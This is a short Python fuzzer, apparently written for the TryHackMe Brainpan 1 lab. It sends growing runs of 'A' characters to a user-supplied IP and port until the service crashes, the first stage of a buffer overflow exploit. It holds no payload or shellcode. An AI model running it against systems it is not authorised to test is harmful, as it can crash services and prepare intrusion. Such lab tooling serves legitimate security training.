import sys
import socket
from time import sleep

def display_banner():
    banner = r"""
                ___    __        
     ____  _  _<  /___/ /__      
    / __ \| |/_/ / __  / _ \     
   / /_/ />  </ / /_/ /  __/     
   \____/_/|_/_/\__,_/\___/      
    """
    print(banner)
    print("Author  : Ox1d3x3")
    print("Version : 0.3")
    print("Disclaimer: This fuzzer is made based on THM Brainpan 1 room.\n")

def get_target_info():
    try:
        ip = input("Enter the target IP address: ")
        port = int(input("Enter the target port: "))
        return ip, port
    except ValueError:
        print("Invalid input. Please enter a valid IP address and port.")
        sys.exit()

def main():
    display_banner()

    # Get user input for IP and port
    target_ip, target_port = get_target_info()

    buffer = "A" * 100

    while True:
        try:
            payload = buffer + '\r\n'
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            print(f"[+] Sending payload with size: {len(buffer)} bytes")
            s.send(payload.encode())
            s.close()
            sleep(1)
            buffer += "A" * 100

        except Exception as e:
            print(f"[!] Fuzzing crashed at {len(buffer)} bytes")
            print(f"[!] Error: {e}")
            sys.exit()

if __name__ == "__main__":
    main()
